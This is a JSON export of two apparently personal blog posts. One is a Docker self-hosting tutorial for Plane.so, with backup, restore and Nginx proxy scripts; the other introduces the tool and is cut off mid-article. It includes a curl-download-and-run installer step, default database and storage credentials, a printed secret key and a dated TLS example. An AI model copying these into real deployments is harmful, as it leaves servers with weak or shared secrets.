"categories": "ZRealm Dev.", "tags": "english, ai-translation, ios-app-development, docker, nginx, project-management, self-hosted", "date": "2024-05-25 21:12:58 +0800", "snippet": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off!Plane.so Docker Self-Hosted Setup RecordPlane Self-Hosted Docker Setup, Backup...", "content": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off!Plane.so Docker Self-Hosted Setup RecordPlane Self-Hosted Docker Setup, Backup, Restore, and Nginx Domain Reverse Proxy Configuration TutorialÔ∏è‚ö†Ô∏èÔ∏èÔ∏èÔ∏è‚ö†Ô∏èÔ∏èÔ∏èÔ∏è‚ö†Ô∏èÔ∏èÔ∏èÔ∏è2025 UpdateÔ∏è ‚ö†Ô∏èÔ∏èÔ∏èÔ∏è‚ö†Ô∏èÔ∏èÔ∏èÔ∏è‚ö†Ô∏èÔ∏èÔ∏èÔ∏èPlane.so is no longer recommended because it initially relied on open-source projects and self-hosting support to grow. However, later versions placed many features behind paid plans. Even self-hosted setups require purchasing licenses to unlock functions, and there are user limits for self-hosting, which goes against the original vision. Additionally, the pricing plans are very confusing, with lifetime, Pro, Business options‚Ä¶ making it uncertain whether new plans will be introduced and new features will only be available in those plans.PrefacePlane.so is a free, open-source, self-hosted project management tool similar to Asana, Jira, and ClickUp. It was founded in 2022, with the first version released in 2023, and is currently still in development.For detailed usage and development process, please refer to the previous article ‚ÄúPlane.so Free Open Source and Self-Hosted Asana/Jira-like Project Management Tool‚Äù. This article only records the process of self-hosting Plane.so using Docker.Self-Hosted Plane Supports Docker, K8s / Cloud, and private on-premise installation Self-Hosted is the Community Edition (officially abbreviated as CE) version Self-Hosted may not include all features of the Cloud version The Self-Hosted version‚Äôs features are set by default to match the Cloud free version. To use other features, you still need to upgrade to a paid version. This article uses Docker + private local installation as an example Currently, the official version does not support exporting from Cloud and importing to the Self-Hosted version; it can only be achieved through API integration. Official Notice: More than 50 users require upgraded machine performanceWe have seen performance degradation beyond 50 users on our recommended 4 GB, 2vCPU infra. Increased infra will help with more users. Released under the AGPL-3.0 license, the first version was launched in January 2023. It is still under development and no official release version is available yet. Please note that open source and support for self-hosted do not mean free of charge. The complete setup example repo is attached at the end. Docker InstallationThis article will not provide a detailed introduction. Please refer to the official Docker installation guide to complete the local Docker environment setup and configuration. The following example uses Docker on macOS.Plane @ Docker InstallationRefer to the official manual. Create Table of Contents &amp; Download Installation Scriptmkdir plane-selfhostcd plane-selfhostcurl -fsSL -o setup.sh https://raw.githubusercontent.com/makeplane/plane/master/deploy/selfhost/install.shchmod +x setup.sh Ensure Docker is installed and running, then execute the script./setup.sh Enter 1 to install (download Images) Waiting for the images used by Plane to be fully loaded After Images Pulled, go to the ./plane-app folder and open the .env configuration file.APP_RELEASE=stableWEB_REPLICAS=1SPACE_REPLICAS=1ADMIN_REPLICAS=1API_REPLICAS=1NGINX_PORT=80WEB_URL=http://localhostDEBUG=0SENTRY_DSN=SENTRY_ENVIRONMENT=productionCORS_ALLOWED_ORIGINS=http://localhost#DB SETTINGSPGHOST=plane-dbPGDATABASE=planePOSTGRES_USER=planePOSTGRES_PASSWORD=planePOSTGRES_DB=planePOSTGRES_PORT=5432PGDATA=/var/lib/postgresql/dataDATABASE_URL=# REDIS SETTINGSREDIS_HOST=plane-redisREDIS_PORT=6379REDIS_URL=# Secret KeySECRET_KEY=60gp0byfz2dvffa45cxl20p1scy9xbpf6d8c5y0geejgkyp1b5# DATA STORE SETTINGSUSE_MINIO=1AWS_REGION=AWS_ACCESS_KEY_ID=access-keyAWS_SECRET_ACCESS_KEY=secret-keyAWS_S3_ENDPOINT_URL=http://plane-minio:9000AWS_S3_BUCKET_NAME=uploadsMINIO_ROOT_USER=access-keyMINIO_ROOT_PASSWORD=secret-keyBUCKET_NAME=uploadsFILE_SIZE_LIMIT=5242880# Gunicorn WorkersGUNICORN_WORKERS=1# UNCOMMENT `DOCKER_PLATFORM` IF YOU ARE ON `ARM64` AND DOCKER IMAGE IS NOT AVAILABLE FOR RESPECTIVE `APP_RELEASE`# DOCKER_PLATFORM=linux/amd64 By default, the Plane service starts using port :80. If there is a conflict, you can change the port. Complete the setup adjustments (directly modifying docker-compose.yml is not recommended because future Plane updates will overwrite this file) Plane @ Docker Startup Run ./setup.sh again Enter 2 to start Plane: After completing the startup and confirming all services are running successfully, open the URL / god-mode/ for the initial setup: The account and password set here have the highest administrative privileges (God/Admin Mode). For security reasons, the password must include special characters, be longer than 8 characters, contain numbers, and have both uppercase and lowercase letters; otherwise, it cannot be submitted. This step is not set to enter the homepage login, showing Instance not configured. Please contact your administrator. Plane God/Admin Mode Management BackendYou can access it from the Plane URL /god-mode/, where you can configure the entire Plane service environment.General Settings:General Settings.Email: Email Notification SMTP SettingsIf you don‚Äôt want to set up your own SMTP server, you can use GMAIL SMTP directly to send emails: Host: smtp.gmail.com Port: 465 Sender email address: The displayed email, e.g. noreply@zhgchg.li Username: Your Gmail account Password: Your Gmail password, if you have two-factor authentication, use an app password. If there is no response after setup, please check the Port and Email Security settings (TLS/STARTTLS: use port 587, SSL: use port 465). Another idea is that since Plane does not currently support Slack notifications, you can set up an SMTP server to receive emails and use a Python script to convert the emails into Slack notifications.AuthenticationPlane service login authentication can be restricted to only Google organization email accounts by disabling ‚ÄúPassword based login‚Äù and enabling only the ‚ÄúGoogle‚Äù login option. Then, generate a login app from the Google login side that limits access to organization accounts only.Artificial IntelligenceAI-related settings currently have limited functionality. Once the key is set, AI can assist in writing Issue Descriptions directly on the Issue page.Image in PlaneCurrently, this feature is not very useful. By adding an Unsplash Key, you can fetch images through the Unsplash API when selecting a project cover image and apply them. ‚ö†Ô∏è‚ö†Ô∏èDisclaimer‚ö†Ô∏è‚ö†Ô∏è The above is the usage introduction for version 0.20-Dev dated 2024-05-25. The official team is actively developing new features and optimizing user experience. Please refer to the latest version settings. After setting up God/Admin Mode, you can use it almost like the Cloud version. For detailed usage and development process introduction, please refer to the previous article ‚ÄúPlane.so Free Open-Source and Self-Hosted Asana/Jira-like Project Management Tool‚Äù.Plane @ Docker UpgradeAs mentioned earlier, Plane is still in development and releases new versions roughly every two to three weeks, with potentially significant changes. It is recommended to carefully read the Release Note for changes and required configuration adjustments before upgrading. ‚ö†Ô∏è Be sure to back up before upgrading! ‚ö†Ô∏è After upgrading, make sure to check if the scheduled backup script still works properly. ‚ö†Ô∏è Be sure to back up before upgrading! ‚ö†Ô∏è After upgrading, make sure to check if the scheduled backup scripts still work properly. ‚ö†Ô∏è Be sure to back up before upgrading! ‚ö†Ô∏è After upgrading, make sure to check if the scheduled backup scripts still work properly. Since Plane is in the development stage and unstable, data loss cannot be ruled out during upgrades. Therefore, it is strongly recommended to back up your data before proceeding. Backup methods will be explained below.Upgrade Method: Run ./setup.sh again Enter 5 to upgrade the Plane (which basically just pulls new Images and restarts) After the Images are pulled, you can restart the service. The upgraded .env file may have changes; please refer to the Release Note for adjustments. Plane @ Docker BackupStarting from 0.20-dev, ./setup.sh added a Backup Data command. However, the official manual only explains how to restore Backup Data to their One paid service. Therefore, I still use my own manual method to back up and upload files, Redis, and the Postgresql Docker Container.Backup Script./plane-backup.sh :#!/bin/bash# Backup Plane data# Author: zhgchgli (https://zhgchg.li)##### Usage# ./plane-backup.sh [target backup folder path] [Plane Docker project name] [max number of Plane backup files to keep, delete oldest if exceeded]# e.g. ./plane-backup.sh /backup/plane plane-app 14###### Configuration# Target backup folderbackup_dir=${1:-.}# Plane Docker project namedocker_project_name=${2:-\"plane-app\"}# Max number of Plane backup files to keep, delete oldest if exceededkeep_count=${3:-7}####### Check if directory existsif [ ! -d \"$backup_dir\" ]; then echo \"Backup failed, directory does not exist: $backup_dir\" exit;fi# Remove oldestcount=$(find \"$backup_dir\" -mindepth 1 -type d \\| wc -l)while [ \"$count\" -ge $keep_count ]; do oldest_dir=$(find \"$backup_dir\" -mindepth 1 -maxdepth 1 -type d \\| while read dir; do # Use stat command to get modification time if [[ \"$OSTYPE\" == \"darwin\"* ]]; then # macOS system echo \"$(stat -f %m \"$dir\") $dir\" else # Linux system echo \"$(stat -c %Y \"$dir\") $dir\" fi done \\| sort -n \\| head -n 1 \\| cut -d ' ' -f 2-) echo \"Remove oldest backup: $oldest_dir\" rm -rf \"$oldest_dir\" count=$(find \"$backup_dir\" -mindepth 1 -type d \\| wc -l)done## Backup newdate_dir=$(date \"+%Y_%m_%d_%H_%M_%S\")target_dir=\"$backup_dir/$date_dir\"mkdir -p \"$target_dir\"echo \"Backing up to: $target_dir\"# Plane's Postgresql .SQL dumpdocker exec -i $docker_project_name-plane-db-1 pg_dump --dbname=postgresql://plane:plane@plane-db/plane -c &gt; $target_dir/dump.sql# Plane's redisdocker run --rm -v $docker_project_name-redis-1:/volume -v $target_dir:/backup ubuntu tar cvf /backup/plane-app_redis.tar /volume &gt; /dev/null 2&gt;&amp;1# Plane's uploaded filesdocker run --rm -v ${docker_project_name}_uploads:/volume -v $target_dir:/backup ubuntu tar cvf /backup/plane-app_uploads.tar /volume &gt; /dev/null 2&gt;&amp;1echo \"Backup Success!\"The first time you create the script file, remember to: chmod +x ./plane-backup.shExecution Method:./plane-backup.sh [target backup folder path] [Plane's Docker project name] [maximum number of Plane backup files to keep, delete oldest backups if exceeded] Backup to target folder path: e.g /backup/plane/ or ./ Plane Docker Project Name: Plane Docker Compose Project Name Plane backup files maximum retention count, delete the oldest backup when exceeded: default 7 copiesExample Execution:./plane-backup.sh /backup/plane plane-app 14 Make sure the Plane is in an active state during execution.Just add the above command to Crontab to schedule automatic backups of Plane. If you encounter an execution error stating that the container cannot be found, please verify the Plane Docker Compose project name or check the script and Docker container names (the official names may have changed).Restore Script./plane-restore.sh :#!/bin/bash# Restore Plane backup data# Author: zhgchgli (https://zhgchg.li)##### How to run# ./plane-restore.sh# inputBackupDir() { read -p \"Folder of the Plane backup to restore (e.g. /backup/plane/2024_05_25_19_14_12): \" backup_dir}inputBackupDirif [[ -z $backup_dir ]]; then echo \"Please provide the backup folder (e.g. sh /backup/docker/plane/2024_04_09_17_46_39)\" exit;fiinputDockerProjectName() { read -p \"Docker project name for Plane (leave empty to use default plane-app): \" input_docker_project_name}inputDockerProjectName docker_project_name=${input_docker_project_name:-\"plane-app\"}confirm() { read -p \"Are you sure you want to restore Plane.so data? [y/N] \" response # Check the response case \"$response\" in [yY][eE][sS]\\|[yY]) true ;; *) false ;; esac}if ! confirm; then echo \"Action cancelled.\" exitfi# Restoreecho \"Restoring...\"docker cp $backup_dir/dump.sql $docker_project_name-plane-db-1:/dump.sql &amp;&amp; docker exec -i $docker_project_name-plane-db-1 psql postgresql://plane:plane@plane-db/plane -f /dump.sql# Restore Redisdocker run --rm -v ${docker_project_name}-redis-1:/volume -v $backup_dir:/backup alpine tar xf /backup/plane-app_redis.tar --strip-component=1 -C /volume# Restore uploaded filesdocker run --rm -v ${docker_project_name}_uploads:/volume -v $backup_dir:/backup alpine tar xf /backup/plane-app_uploads.tar --strip-component=1 -C /volumeecho \"Restore Success!\"Remember to run chmod +x ./plane-restore.sh the first time you create the script file.Execution Method: ./plane-restore.shInput: Folder of the Plane backup file to restore (e.g. /backup/plane/2024_05_25_19_14_12)Input: Docker project name for Plane (leave blank to use default plane-app)Input: Are you sure you want to restore Plane.so data? [y/N] yAfter seeing Restore Success!, you need to restart Plane for the changes to take effect.Use Plane ./setup.sh and enter 4 Restart:Go back to the website, refresh, and log in to Workspace to check if the recovery was successful:Done! ‚ö†Ô∏è It is recommended to regularly test the backup and restore process to ensure backups are useful in case of emergencies.Plane @ Docker UpgradeAs mentioned earlier, Plane is still in development and releases a new version every two to three weeks. Changes can be significant; it is recommended to carefully read the Release Note for updates and required configuration adjustments before upgrading. ‚ö†Ô∏è Be sure to back up before upgrading! ‚ö†Ô∏è After upgrading, make sure to check if the scheduled backup scripts still work properly. ‚ö†Ô∏è Be sure to back up before upgrading! ‚ö†Ô∏è After upgrading, make sure to check if the scheduled backup script still works properly. ‚ö†Ô∏è Backup before upgrading! ‚ö†Ô∏è After upgrading, make sure to verify that the scheduled backup script still functions correctly. Since Plane is in the development stage and unstable, it cannot guarantee that upgrades will not cause data loss. Therefore, it is recommended to back up your data before operating.Upgrade Method: Run ./setup.sh again Enter 5 to upgrade the Plane (which basically just downloads new images &amp; restarts). After ‚ÄúImages Pulled‚Äù is complete, you can restart the service. The upgraded .env file may have changes. Please refer to the Release Note for adjustments. After the upgrade, be sure to check if the scheduled backup script still works properly. If the container name changes, you need to update the backup, restore, and Nginx reverse proxy scripts mentioned below. Using Nginx + Plane for Reverse ProxyBecause we may need to provide multiple web services simultaneously, such as Self-Hosted LibreChat (ChatGPT), Self-Hosted Wiki.js, Self-Hosted Bitwarden, etc., each service defaults to port 80. If we don‚Äôt want to specify the port in the URL when using them, we need to run a Docker Nginx as a reverse proxy for the web services.Effect as follows:chat.zhgchg.li -&gt; LibreChat :8082wiki.zhgchg.li -&gt; Wiki.js :8083pwd.zhgchg.li -&gt; Bitwarden :8084plane.zhgchg.li -&gt; Plane.so :8081To achieve the above effect, first move the ./plane-selfhost directory into a unified directory, here named webServices.Final Directory Structure Preview:Adjust the webServices/plane-selfhost/plane-app/.env environment configuration file:APP_RELEASE=stableWEB_REPLICAS=1SPACE_REPLICAS=1ADMIN_REPLICAS=1API_REPLICAS=1NGINX_PORT=8081WEB_URL=http://plane.zhgchg.liDEBUG=0SENTRY_DSN=SENTRY_ENVIRONMENT=productionCORS_ALLOWED_ORIGINS=http://plane.zhgchg.li#DB SETTINGSPGHOST=plane-dbPGDATABASE=planePOSTGRES_USER=planePOSTGRES_PASSWORD=planePOSTGRES_DB=planePOSTGRES_PORT=5432PGDATA=/var/lib/postgresql/dataDATABASE_URL=# REDIS SETTINGSREDIS_HOST=plane-redisREDIS_PORT=6379REDIS_URL=# Secret KeySECRET_KEY=60gp0byfz2dvffa45cxl20p1scy9xbpf6d8c5y0geejgkyp1b5# DATA STORE SETTINGSUSE_MINIO=1AWS_REGION=AWS_ACCESS_KEY_ID=access-keyAWS_SECRET_ACCESS_KEY=secret-keyAWS_S3_ENDPOINT_URL=http://plane-minio:9000AWS_S3_BUCKET_NAME=uploadsMINIO_ROOT_USER=access-keyMINIO_ROOT_PASSWORD=secret-keyBUCKET_NAME=uploadsFILE_SIZE_LIMIT=5242880# Gunicorn WorkersGUNICORN_WORKERS=1# UNCOMMENT `DOCKER_PLATFORM` IF YOU ARE ON `ARM64` AND DOCKER IMAGE IS NOT AVAILABLE FOR RESPECTIVE `APP_RELEASE`# DOCKER_PLATFORM=linux/amd64 Replace the URL with the desired one, using plane.zhgchg.li as an example. Change NGINX_PORT to 8081 and use the original 80 for the reverse proxy Nginx. webServices/ Create a docker-compose.yml file here to host Nginx:version: '3.8'services: webServices-nginx: image: nginx restart: unless-stopped volumes: - ./nginx/conf.d/plane.zhgchg.li.conf:/etc/nginx/conf.d/plane.zhgchg.li.conf ports: - 80:80 - 443:443 networks: - plane-app_default # Network used by planenetworks: plane-app_default: external: true We need to add the Plane app‚Äôs network to NginxwebServices/ Create the /conf.d directory and the plane.zhgchg.li.conf file:# For plane.zhgchg.li# http example:server { listen 80; server_name plane.zhgchg.li; client_max_body_size 0; location / { proxy_pass http://plane-app-proxy-1; # plane proxy-1 service name proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_set_header X-Forwarded-Proto $scheme; }}# https &amp; http example:# server {# listen 443 ssl;# server_name plane.zhgchg.li;# #ssl# ssl_certificate /etc/nginx/conf/ssl/zhgchgli.crt; # Replace with your domain's crt &amp; remember to mount the key into Docker via docker-compose.yml volumes# ssl_certificate_key /etc/nginx/conf/ssl/zhgchgli.key; # Replace with your domain's key &amp; remember to mount the key into Docker via docker-compose.yml volumes# ssl_prefer_server_ciphers on;# ssl_protocols TLSv1.1 TLSv1.2;# ssl_ciphers \"EECDH+ECDSA+AESGCM EECDH+aRSA+AESGCM EECDH+ECDSA+SHA384 EECDH+ECDSA+SHA256 EECDH+aRSA+SHA384 EECDH+aRSA+SHA256 EECDH+aRSA+RC4 EECDH EDH+aRSA RC4 !aNULL !eNULL !LOW !3DES !MD5 !EXP !PSK !SRP !DSS !RC4\";# ssl_ecdh_curve secp384r1; # Requires nginx &gt;= 1.1.0# ssl_session_timeout 10m;# ssl_session_cache shared:SSL:10m;# add_header Strict-Transport-Security \"max-age=63072000; includeSubDomains; preload\";# client_max_body_size 0;# location / {# proxy_pass http://plane-app-proxy-1; # plane proxy-1 service name# proxy_set_header Host $host;# proxy_set_header X-Real-IP $remote_addr;# proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;# proxy_set_header X-Forwarded-Proto $scheme;# }# }# server {# listen 80;# server_name plane.zhgchg.li;# return 301 https://plane.zhgchg.li$request_uri;# } proxy_pass Enter the service entry in the Plane network Here, only HTTP is used as an example. To support HTTPS, you can refer to the method of self-signed certificates. Since multiple docker-compose.yml files need to be started individually before launching the Nginx reverse proxy, we can put all the startup scripts into a single Shell Script.webServices/ create a /start.sh file:#!/bin/sh# Startup script wrapper# Start Plane and other services firstdocker compose -f ./plane-selfhost/plane-app/docker-compose.yaml --env-file ./plane-selfhost/plane-app/.env up -d# Start Nginx lastdocker compose -f ./docker-compose.yml --env-file ./.env up -dRemember to run chmod +x ./start.sh the first time you create the script file.You can also create one to stop the service. Create the /stop.sh file under webServices/:#!/bin/sh# Stop script wrapperdocker compose -f ./plane-selfhost/plane-app/docker-compose.yaml --env-file ./plane-selfhost/plane-app/.env downdocker compose -f ./docker-compose.yml --env-file ./.env downRemember to run chmod +x ./stop.sh the first time you create the script file.Activation After packaging Nginx reverse proxy + Plane service + others, you can start all services directly by running ./start.sh../start.shDNS SettingsHosted on the internal network, the IT department needs to add a DNS record in the internal DNS for plane.zhgchg.li -&gt; server IP address.plane.zhgchg.li server IP addressIf you are testing locally on your own computer, you can add the following to the /private/etc/hosts file:127.0.0.1 plane.zhgchg.liAfter completing the DNS setup, you can access Plane by visiting plane.zhgchg.li!Frequently Asked Questions Nginx failed to start and keeps restarting. Checking the log shows nginx: [emerg] host not found in upstream.This means the Nginx reverse proxy service cannot find the Plane service. You need to verify if the name http://plane-app-proxy-1 is correct and if the network settings in the Nginx docker-compose.yml are properly configured. 502 Bad Gateway AppearsThe startup order is incorrect (make sure Nginx reverse proxy starts last) or the Plane process has restarted. Try restarting, and it should work. When the Nginx default homepage welcome to nginx! appears, you can no longer access Plane via the original IP:80 address when using reverse proxy. You must use the URL instead. The URL cannot be resolved, and the host cannot be found. Please check if the DNS network settings are correct. ‚ö†Ô∏è‚ö†Ô∏èSecurity Issues‚ö†Ô∏è‚ö†Ô∏èSince the Plane project is still under development and open source, it is uncertain whether there are serious system vulnerabilities. The worst case could be an entry point for intrusion. Therefore, it is not recommended to host Plane.so Self-Hosted on a public network. It is better to add an extra layer of security verification (Tunnel, certificate, or VPN) to allow access. If hosted on an internal network, it should also be properly isolated.During development, projects inevitably have bugs, experience, and security issues. Please be patient with the Plane.so team; if you encounter any problems, feel free to report them below: Issue Reporting: https://github.com/makeplane/plane/issues Official Discord: https://discord.com/invite/A92xrEGCge Complete Self-Hosted Repo Example DownloadPlane.so Usage and Scrum Process Integration Tutorial Plane.so Free Open-Source and Self-Hosted Alternative to Asana/Jira Project Management ToolIf you have any questions or feedback, feel free to contact me. üîó Copy link to share! üç∫ Buy me a beer on PayPal This post was originally published on Medium (View original post), and automatically converted and synced by ZMediumToMarkdown. Improve this page on Github." }, { "title": "Plane.soÔΩúFree Open-Source Self-Hosted Project Management Tool Like Asana and Jira", "url": "/posts/zrealm-dev/plane-so-free-open-source-self-hosted-project-management-tool-like-asana-and-jira-9d0f23784359/", "categories": "ZRealm Dev.", "tags": "english, ai-translation, ios-app-development, asana, scrum, project-management, open-source", "date": "2024-05-25 16:28:02 +0800", "snippet": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off!Plane.so Free, Open-Source, and Self-Hosted Asana/Jira-Like Project Management...", "content": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off!Plane.so Free, Open-Source, and Self-Hosted Asana/Jira-Like Project Management ToolPlane.so Project Management Tool Introduction and Usage with Scrum Process IntegrationÔ∏è‚ö†Ô∏èÔ∏èÔ∏èÔ∏è‚ö†Ô∏èÔ∏èÔ∏èÔ∏è‚ö†Ô∏èÔ∏èÔ∏èÔ∏è2025 UpdateÔ∏è ‚ö†Ô∏èÔ∏èÔ∏èÔ∏è‚ö†Ô∏èÔ∏èÔ∏èÔ∏è‚ö†Ô∏èÔ∏èÔ∏èÔ∏èPlane.so is no longer recommended because it initially grew by relying on open-source projects and self-hosting support. However, in later versions, many features were moved into paid plans. Even self-hosting requires purchasing a license to unlock features, and there are user limits for self-hosted setups, which no longer matches the original vision. Additionally, the pricing plans are very confusing, with lifetime, Pro, Business options, and it‚Äôs uncertain whether new plans will be introduced, locking new features behind them even for paying users.BackgroundAsanaAt my previous company Pinkoi, I first experienced the power of the Asana project management tool. Whether for internal project management or cross-team collaboration, Asana plays a key role in decoupling dependencies between people and tasks, improving collaboration efficiency.In my previous company, all teams from the product team to operations and business teams (such as HRBP, Finance, Marketing, BD‚Ä¶) had a publicly shared Project as a single collaboration entry point across teams. When other teams needed assistance, they could directly create a Task (or use a Template Task) within that Project (usually there was a ‚ÄúNeed Help!‚Äù Section). The receiving team would then take over the Task and make arrangements.Cross-team collaboration with the management team, such as procurement and recruitment processes, can be done by creating a Task and tracking progress through it; collaboration with the business team includes marketing campaign planning and tasks requiring engineering support for modifications, etc.If you don‚Äôt have Asana or a similar project management tool: For everything, we need direct communication with the other team. Direct communication is most effective for P0 matters, but in daily work, 90% of issues are not P0. Direct person-to-person communication for all matters, big or small, is inefficient and can interrupt the other person‚Äôs workflow. Task execution is not transparent; only the two parties involved know the progress. For multi-party tasks, progress can only be repeatedly confirmed through communication. Additionally, supervisors find it difficult to manage tasks and arrange them reasonably. Task scheduling: In daily work, we receive many tasks with varying priorities and directions. Having tools allows us to collect and categorize similar issues, so we can address them together later. This also makes it easier to identify important tasks in daily planning. Task handover involves using tools to record task details and execution status. If assistance from others is needed, they can quickly take over the task based on the content in the Task. Back to project management, Asana offers flexible, multi-dimensional, and automated project management tools that can be combined as needed. There are many ways to use Asana. Below are a few use cases. It is recommended to identify your needs first before applying relevant Asana examples. Asana‚Äôs Taiwan distributor also provides comprehensive training. Feel free to contact them if interested. (This article contains no sponsored content)Example 1Team Project To Do: Tasks to start this week and next week In Progress: Ongoing Projects Review: Completed, waiting for Sprint Review Backlog: Task pool, from which tasks are selected weekly for scheduling and execution Team Scrum ProjectBesides the main team Project, a separate Scrum Project will be created (Asana Tasks can be added to multiple Projects simultaneously) to review the tasks completed in each Sprint.Example 2Example 2 uses Sections to separate Sprints, creating a Section each week to drag tasks into, and uses Labels to mark other statuses.Back to RealityAs mentioned earlier, the above describes the scenario of the former company Pinkoi using the Asana project management tool; returning to an environment without any project management tools in recent months has made me even more aware of the importance of tools for work efficiency.Currently, there is no modern project management tool available. Due to procurement (expense control), internal control issues (intranet only), and personal data audit restrictions (must be local), Asana cannot be directly implemented.Due to the above environmental constraints, I could only focus on open-source, self-hosted project management tools. The solutions I found were mainly Redmine, OpenProject, Taiga‚Ä¶ After trying several, the results were disappointing‚Äîlacking features and having unfriendly UI/UX. That was until I accidentally discovered Plane.so, a project management tool newly launched in January 2023.By the way, I recommend this website, which lists many services that support Self-Hosted:awesome-selfhostedA list of free software network services and web applications that you can host on your own servers awesome-selfhosted.net Having said so much, the main text begins below.Table of ContentsThis article is divided into: Plane.so Introduction Plane.so Operation Guide Plane.so x Scrum Workflow Example Appendix You can check according to your needs. For Docker Self-Hosted setup tutorial, please refer to the next article ‚ÄúPlane.so Docker Self-Hosted Setup Record‚Äù.Introduction to Plan.soIntroductionPlane - The open source project management toolOpen-source project management tool to manage issues, sprints, and product roadmaps with peace of mind. plane.soPlane was founded in 2022 and is a startup from Delaware, USA, and India. Currently, most developers active on Linkedin and Github are based in India. The company has raised $4 million in seed angel funding, led by OSS Capital.How Plane, an open-source alternative to Jira, got to the #1 in project management on GitHub in‚Ä¶Our lessons from 0 to 20K GitHub stars in a year plane.soCurrently, Plane holds the top spot in the Github Project Management category, using the AGPL-3.0 license as open source. The first version was released in January 2023 and is still under development, with no official release version available yet. Please note: ‚ö†Ô∏è Open source does not mean free ‚ö†Ô∏è. Like Github and Gitlab, there are many project management tools similar to Github, such as Asana, Jira, and Clickup, but none are good enough to rival Gitlab‚Äôs open-source product. Plane‚Äôs goal is to become the Gitlab of project management tools. Updates are usually released every two to three weeks, with some changes being significant or still having security issues. Temporarily does not support multiple languages (Chinese) Support Self-Hosted Currently, the official version does not support exporting from Cloud and importing to Self-Hosted. You can only achieve this through API integration. Therefore, if you are considering using Self-Hosted locally, it is recommended to treat Cloud as a trial version only. macOS App, iOS App, and Android App are also under active development. Plane Product Roadmap can be found at official website:https://sites.plane.so/plane/459cfcdf-dc9c-49a6-9d4b-a89f91440189/?board=kanbanOpen Source Repo:PlanPlane offers a cloud version service starting at $0. The Pro version provides more frameworks, integrations, and automation features.Additionally, the official team is promoting the $799 early lifetime plan. Teams interested in supporting with payment can refer directly to this plan:Community Edition (officially called CE), Self-Hosted version, also starts at $0. Advanced features still require purchasing Pro, but it supports Self-Hosted.FrameworkPlane.so differs from Asana‚Äôs multi-dimensional flexibility but Plane is composed of the following framework for project management use: Issues: Same as Asana Task, create an Issue for any work to be scheduled or kept as a record. Cycles: Similar to a Sprint, a time period or version for an iteration. Each Issue can only exist in one Cycle. Modules: Projects, modules, and categorization features. Each issue can include multiple modules. Layouts &amp; Views: You can view Issues using Gantt charts, calendars, kanban boards, lists, and sheet modes. You can also save filter conditions and display settings as Views for quick access. Inbox: The proposed process allows creating a proposal Issue. Only after approval will the Issue be created in the project for execution; if not approved, it will be discarded directly. Pages: A simple document feature that lets you record work and product-related notes. Drive: Similar to Google Drive team file features.Currently, this feature is not available in the free version or the CE (Self-Hosted) version.Plane.so Operation GuideWe can quickly, freely, and directly start using the Plane Cloud version:Workspace The first time you enter Plane.so, you will need to create your first Workspace. A Workspace is the same as an Asana workspace; one account can join multiple Workspaces. For small companies using it across teams, it can be within the same Workspace. For large companies with cross-team collaboration, Plane lacks features like Asana‚Äôs Team function and Project grouping. Having all projects in the same Workspace can cause confusion. It is recommended to use separate Workspaces to distinguish teams. After creation, you can switch between different Workspaces using the Workspace dropdown menu, and also access Workspace Settings from there:Settings include: General Workspace profile picture, name, URL Billing and plans Payment Information and Upgrade Options Integrations Third-party integrations, currently only Github and Slack integrations are available in the free version Imports feature currently supports only Jira and Github Project imports. Exports feature currently supports export in csv, excel, and json formats only Webhooks API tokens, self-integrating API A more important setting is Members, where we need to invite team members to join the Workspace:Identity: Guest and Viewer currently have no significant functional differences; both can only view Issues, Comments, and Emojis. External users with email addresses outside the organization are classified as Guests, while those within the same organization are Viewers. Member can operate all functions. Admin can access Settings. Home Page Home All Projects and Member Status in the Entire Workspace Analytics All Members, Issues Analysis Projects All Projects All Issues from All Projects Active Cycles Current Cycle Status for All Projects Notifications Issues Notifications ProjectsEnter Projects to view all public and joined Projects: Project name, description, cover image, prefix (Issue Alias e.g. APP-1) Project Permissions: Public - All members who join the Workspace can view and join; Private - Only invited members can join Lead: Project main person in charge In the top right corner of the project, the ‚Äú‚Ä¶‚Äù allows you to: Add to favorites, Pin to My Favorites (above Your Projects) Publish generates a public external link, just like the official Roadmap Project Draft Issues View Saved Draft Issues Archives View Archived Issues Other Settings: General: Project General Settings Members: Project members, project permissions States: Project Issue Status (to be introduced later) Labels: Project Labels Management Features: Allows control over which features to enable (Inbox feature is disabled by default) Estimates: Project Time Estimation Field Settings (to be introduced later) Integrations: Third-Party Integrations (Workspace must be enabled first) Automations: The free version currently only supports automatically archiving Closed Issues after X time and automatically closing incomplete Issues after X time. Issues After entering, you can create a Project from the Projects section on the left. Unlike Asana, an Issue in Plane can only be added to one Project. The display mode can be switched in the top right corner. By default, all Sub-Issues will be expanded. If it feels cluttered, you can go to Display -&gt; uncheck Show sub-Issues. Click ‚ÄúCreate Issue‚Äù to start creating an issue: Can be saved as draft Issues Supports text styles and code blocks Supports Markdown Supports text wrapping around images, allowing direct drag-and-drop image uploads Supports multiple assignees (this is more convenient than Asana, which only allows one assignee per task) Choose Priority; different priorities have different highlight styles (currently, Priority cannot be customized). Choose Modules, you can add multiple Modules, such as: Login Optimization, 